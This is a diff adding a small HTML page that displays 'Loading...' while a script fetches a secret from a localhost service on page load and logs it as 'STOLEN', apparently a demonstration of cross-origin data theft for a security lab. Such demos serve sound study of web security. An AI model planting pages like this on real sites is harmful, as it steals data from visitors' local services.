@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Loading...</h2>
+
+<script>
+fetch("http://localhost:8081/secret")
+  .then(r => r.json())
+  .then(data => {
+    console.log("STOLEN:", data)
+  })
+</script>
+
+</body>
+</html>
